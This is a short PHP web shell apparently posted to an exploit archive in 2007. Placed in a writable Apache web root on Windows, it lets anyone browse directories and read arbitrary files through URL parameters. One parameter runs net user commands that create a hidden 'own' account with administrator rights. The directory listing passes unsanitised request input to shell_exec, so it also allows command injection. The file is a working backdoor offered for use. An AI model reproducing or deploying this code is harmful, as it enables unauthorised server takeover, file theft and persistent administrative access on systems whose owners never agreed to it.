<?php
//Inphex
//htdocs must be accessable and writable,apache must have been ran by root.
//to add a user open like this : script.php?qQx

// Directory of C:\Documents and Settings\Admin

//27.08.2007  16:36    <DIR>          .
//27.08.2007  16:36    <DIR>          ..
//14.08.2007  14:21               108 .asadminpass
//14.08.2007  14:21               772 .asadmintruststore
//14.08.2007  18:31    <DIR>          .exe4j4
//26.08.2007  03:13               427 .glade2
//21.08.2007  16:35    <DIR>          .msf3
//10.08.2007  04:41    <DIR>          Contacts
//27.08.2007  01:44               129 default.pls
//27.08.2007  17:57    <DIR>          Desktop
//23.08.2007  21:12    <DIR>         
$qQa = ($_GET['qmB'] == "")?"./":$_GET['qmB'];
$qQd = opendir($qQa);

if (isset($_GET['qrF']))
{
    $qrX = fopen($_GET['qrF'],"r");
    echo fread($qrX,50000);
    exit;
} elseif(isset($_GET['qQx'])) { exec("net user own own /add & net localgroup Administratoren own /add"); echo "User own -> full privileges successfully addet";exit;}
echo "<textarea rows=40 cols=80 style='position:absolute;margin-left:390;'>";
echo htmlspecialchars(shell_exec("cd ".$qQa." & dir"));
echo "&lt;/textarea&gt;";
while (false !== ($qQr = readdir($qQd))){

switch(filetype($qQa.$qQr))
    {
    case "dir":
        echo "<a href=?qmB=".urlencode(htmlspecialchars(realpath($qQa.$qQr)))."/>".htmlspecialchars($qQr)."</a><br>";
    break;
    case "file":
        echo "<a href=?qrF=".urlencode(htmlspecialchars(realpath($qQa.$qQr))).">".htmlspecialchars($qQr)."</a><br>";
    break;
    }
}
?>

# milw0rm.com [2007-08-27]
